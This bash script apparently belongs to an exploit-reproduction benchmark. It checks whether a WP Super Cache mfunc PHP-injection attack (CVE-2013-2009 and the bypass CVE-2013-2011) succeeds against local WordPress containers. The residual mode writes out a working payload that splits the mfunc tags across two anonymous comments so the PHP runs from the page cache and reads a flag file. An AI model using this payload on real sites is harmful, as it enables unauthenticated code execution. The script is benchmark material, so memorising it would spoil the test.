#!/usr/bin/env bash
# =====================================================================
# PCBV2-0213 wordpress-wp-super-cache-plugin-cve-2013-2011
#   pair: CVE-2013-2009 -> CVE-2013-2011 (WP Super Cache mfunc cache PHP injection)
#   seed     (CVE-2013-2009): one guest comment with a complete <!--mfunc--> pair.
#            V0 (1.2, no guard) bakes PHP into the page cache; anonymous GET
#            of /pcb-cache-post/ includes it and echoes /flag/pcb_flag.txt.
#            V1 (1.3.1 no_mfunc_in_comments open+close) zaps the pair -> blocked.
#   residual (CVE-2013-2011): SAME sink; split open/close across TWO comments so
#            V1's per-comment replace misses, phase2 recombinations on the page.
#            Inline payload (no heldout files).
#   效果通道 = cached post HTML (mfunc -> include/eval of cache PHP)
#   判定基准 = RUN_FLAG（wrong/stale 时 RUN_FLAG=override，通道含真 flag ≠ override -> 10）
#   退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

SVC="wp-$VERSION"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 80 2>/dev/null | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_WP_V0_0:-}";; v1) PORT="${PORT_WP_V1_0:-}";; v2) PORT="${PORT_WP_V2_0:-}";; *) PORT="${PORT_WP_V1_0:-}";;
  esac
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

# 就绪等待：wordpress 登录页 200（wp-entrypoint 完成 core+插件+cache）
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request
port = sys.argv[1]
for _ in range(150):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/wp-login.php", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: wordpress $VERSION not ready on :$PORT" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "
import json, sys, ast
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
    raise SystemExit
except Exception:
    pass
try:
    v = ast.literal_eval(s)
    if isinstance(v, dict):
        print(json.dumps(v))
        raise SystemExit
except Exception:
    pass
print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))
" "$CAND")"
else
  # residual：CVE-2013-2011 —— V1(1.3.1) 的 no_mfunc_in_comments 只在同一条评论字符串里
  # 同时出现开闭标签时才 zap。把 <!--mfunc PAYLOAD--> 和 <!--/mfunc--> 拆成两条评论后，
  # 各次 filter 都配不成对，phase2 在整页 buffer 上仍把 mfunc 写成 <?php。
  CAND='{"mode":"split_comment_mfunc","comments":["<!--mfunc echo @file_get_contents('"'"'/flag/pcb_flag.txt'"'"'); -->","<!--/mfunc-->"]}'
fi
printf '%s' "$CAND" > "$WORK_DIR/cand.json"

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
BODY="$(printf '%s' "$OUT" | "$PY" -c "
import json,sys
raw=sys.stdin.read()
try:
    d=json.loads(raw)
except Exception:
    print(raw[:500]); raise SystemExit
body = d.get('body_joined') or d.get('body') or ''
print(body)
if d.get('error') and not body:
    print(d.get('error'), file=sys.stderr)
" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then
  echo "verify[$MODE] version=$VERSION rc=0 (judge_flag=$RUN_FLAG)" >&2
  exit 0
fi
# env failure (no post form) vs blocked (comments posted, no flag)
if grep -q "comment_post_ID missing" <<<"$OUT"; then
  echo "$OUT" >&2
  echo "verify[$MODE] version=$VERSION rc=20" >&2
  exit 20
fi
echo "verify[$MODE] version=$VERSION rc=10 (judge_flag=$RUN_FLAG)" >&2
exit 10
